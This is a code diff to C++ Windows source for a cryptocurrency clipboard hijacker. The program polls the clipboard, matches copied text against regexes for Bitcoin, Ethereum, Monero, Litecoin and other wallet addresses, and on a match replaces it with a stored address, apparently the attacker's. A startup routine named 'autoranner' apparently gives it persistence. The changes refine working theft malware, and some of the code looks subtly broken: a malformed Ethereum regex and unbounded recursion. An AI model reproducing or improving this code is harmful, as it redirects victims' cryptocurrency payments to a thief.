@@ -1,14 +1,13 @@
-#include <iostream>
 #include <string>
 #include <atlstr.h>
 #include <winuser.h>
 #include <regex>
-#pragma comment(lib, "user32.lib")
 
+#pragma comment(lib, "user32.lib")
 #pragma warning(disable:4326)
 
-
 using namespace std;
+
 void Writebuffer(string&);
 string Readbuffer();
 void checkers(string& data);
@@ -30,11 +29,12 @@ void main()
 	}
 	autoranner();
 	Reactor();
-	Readbuffer();
+	
 }
 
 void checkers(string& data)
 {
+	bool flag = false;
 	cmatch res;
 	regex btc("(?:^(bc1|[13])[a-zA-HJ-NP-Z0-9]{26,35}$)");
 	regex eth1("(?:^0x[a - fA - F0 - 9]{40}$)");
@@ -46,14 +46,25 @@ void checkers(string& data)
 	regex bch("^((bitcoincash:)?(q|p)[a-z0-9]{41})");
 	regex dash("(?:^X[1-9A-HJ-NP-Za-km-z]{33}$)");
 	regex arr[9]{ btc, eth1, xmr, xlm, xrp, ltc, nec, bch, dash };
-	for (int i = 0; i <= 8; i++)
+	if (flag == false)
 	{
-		bool g = regex_match(data.c_str(), res, arr[i]);
-		if (g)
+		for (int i = 0; i <= 8; i++)
 		{
-			Writebuffer(crypto);
+			bool g = regex_match(data.c_str(), res, arr[i]);
+			if (g)
+			{
+				Writebuffer(crypto);
+				flag = true;
+
+			}
 		}
 	}
+	else
+
+	{
+		Reactor();
+	}
+
 }
 
 void autoranner()
@@ -67,18 +78,20 @@ void autoranner()
 
 void Reactor()
 {
-	while (true)
+	while (IsClipboardFormatAvailable(CF_TEXT))
 	{
 		if (OpenClipboard(NULL))
 		{
-			if (IsClipboardFormatAvailable(CF_TEXT))
-			{
-				Readbuffer();
-				CloseClipboard();
-			}
+
+			Readbuffer();
+			CloseClipboard();
+			
+
 		}
 		Sleep(2000);
 	}
+	Reactor();
+	
 }
 
 string Readbuffer()
@@ -110,7 +123,7 @@ void Writebuffer(string& crypto)
 		chBuffer = (char*)GlobalLock(buffer);
 		memcpy(GlobalLock(buffer), crypto.c_str(), crypto.size() + 1);
 		GlobalUnlock(buffer);
-		SetClipboardData(CF_TEXT, buffer); 
+		SetClipboardData(CF_TEXT, buffer);
 		CloseClipboard();
 		Sleep(2000);
 		Reactor();
